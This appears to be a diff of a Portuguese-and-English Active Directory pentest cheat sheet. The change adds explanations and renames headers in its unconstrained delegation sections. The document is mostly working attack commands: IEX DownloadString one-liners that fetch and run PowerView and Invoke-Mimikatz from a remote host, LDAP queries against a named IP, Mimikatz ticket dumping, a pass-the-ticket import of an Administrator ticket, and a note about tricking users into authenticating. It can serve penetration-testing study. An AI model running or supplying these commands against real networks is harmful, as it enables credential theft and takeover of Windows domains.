@@ -1240,7 +1240,8 @@ hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
 ```
 ## UNCONSTRAINED DELEGATION - MIMIKATZ
-##### UNCONSTRAINED DELEGATION - LOAD REQUIREMENTS
+Unconstrained delegation is a privilege that can be assigned to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates on a computer with Kerberos unrestricted delegation privilege enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
+##### UNCONSTRAINED DELEGATION MIMKATZ - LOAD REQUIREMENTS
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
 import-module .\Microsoft.ActiveDirectory.Management.dll
@@ -1252,7 +1253,7 @@ import-module .\PowerView.ps1
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
 ```
-##### UNCONSTRAINED DELEGATION - FIND COMPUTERS WITH UNCONSTRAINED DELEGATION (POWERVIEW)
+##### UNCONSTRAINED DELEGATION MIMKATZ - FIND COMPUTERS WITH UNCONSTRAINED DELEGATION (POWERVIEW)
 PROCURE POR CONTAS DE COMPUTADOR COM UNCONSTRAINED DELEGATION
 ```
 Get-NetComputer -UnConstrained
@@ -1271,7 +1272,7 @@ $LDAPSEARCH.FindAll()
 ldapsearch -LLL -x -h 54.189.219.43   -D "vegeta@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
 ldapsearch -LLL -x -h 54.189.219.43   -D "regularuser@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep sAMAccountName
 ```
-##### UNCONSTRAINED DELEGATION - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAR OS TICKETS KERBEROS.
+##### UNCONSTRAINED DELEGATION MIMKATZ - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAR OS TICKETS KERBEROS.
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
 Import-Module .\Invoke-Mimikatz.ps1
@@ -1281,18 +1282,18 @@ Invoke-Mimikatz
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
-##### UNCONSTRAINED DELEGATION - LISTAR OS TICKETS / EXPORTAR OS TICKETS COM MIMIKATZ (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
+##### UNCONSTRAINED DELEGATION MIMKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS COM MIMIKATZ (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
 ```
 sekurlsa::tickets
 sekurlsa::tickets /export
 ```
-##### UNCONSTRAINED DELEGATION - VERIFICAR QUEM ESTÁ LOGADO EM UMA MÁQUINA / ONDE UM USUARIO ESTÁ LOGADO
+##### UNCONSTRAINED DELEGATION MIMKATZ - VERIFICAR QUEM ESTÁ LOGADO EM UMA MÁQUINA / ONDE UM USUARIO ESTÁ LOGADO
 AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE ALGUM TIPO DE ADMIN)
 ```
 Invoke-UserHunter -ComputerName server01  -Delay 5 -Verbose
 Invoke-UserHunter -ComputerName server01 -UserIdentity administrator -Delay 5 -Verbose
 ```
-##### UNCONSTRAINED DELEGATION - REUTILIZAR O TICKET DO USUARIO:  (VAI IMPORTAR NO CONTEXTO DO USUARIO, INICIAR NOVO MIMKATZ COM USUARIO NORMAL E IMPORTAR)
+##### UNCONSTRAINED DELEGATION MIMKATZ - REUTILIZAR O TICKET DO USUARIO:  (VAI IMPORTAR NO CONTEXTO DO USUARIO, INICIAR NOVO MIMKATZ COM USUARIO NORMAL E IMPORTAR)
 ```
 dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
 ```
@@ -1302,6 +1303,7 @@ kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TEC
 
 
 ## UNCONSTRAINED DELEGATION - RUBEUS
+Unconstrained delegation is a privilege that can be assigned to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates on a computer with Kerberos unrestricted delegation privilege enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
 ##### UNCONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
